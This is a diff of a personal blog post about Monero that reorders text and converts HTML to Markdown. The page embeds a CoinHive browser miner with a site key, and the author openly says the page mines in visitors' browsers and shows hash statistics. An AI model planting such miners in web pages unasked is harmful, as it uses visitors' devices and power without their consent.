@@ -6,10 +6,6 @@ tags: [monero, XMR, crypto, currency, cryptocurrency, mine, miner, mining, graph
 comments: true
 ---
 <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
-	
-I discovered an interesting service today that allows you to embed a Monero Javascript miner into your own webpage. 
-I thought this was an interesting idea and immediatly signed up and gave it a try.
-The results of that are seen on this page. 
 
 <script>
 	var miner = new CoinHive.Anonymous('l0YCiLkEmA6Nk1UBDRL9O0OsHSOem86y');
@@ -45,12 +41,19 @@ The results of that are seen on this page.
 	}
 </script>
 
-<p>Monero (XMR) is a cryptocurrency focused around privacy, decentralization and scalability. It was created in April of 2014 and has since seen a huge uptick in adoption. 
-The current price of Monero based on data retrieved from the CryptoCompare API is <p id="XMRprice"></p>
+Monero (XMR) is a cryptocurrency focused around privacy, decentralization and scalability. It was created in April of 2014 and has since seen a huge uptick in adoption. 
+The current price of Monero based on data retrieved from the CryptoCompare API is **<p id="XMRprice"></p>**
+
+I discovered an interesting service today that allows you to embed a Monero Javascript miner into your own webpage. 
+I thought this was an interesting idea and immediatly signed up and gave it a try.
+The results of that are seen on this page. 
+
 <br />
 <br />
-<h3>Miner Stats since visiting this page</h3>
+### Miner Stats since visiting this page
 <div>
 Hashes per second: <p id="hashesPerSecond"></p>
 Total Hashes: <p id="totalHashes"></p>
 Accepted Hashes: <p id="acceptedHashes"></p>
+<br />
+</div> 
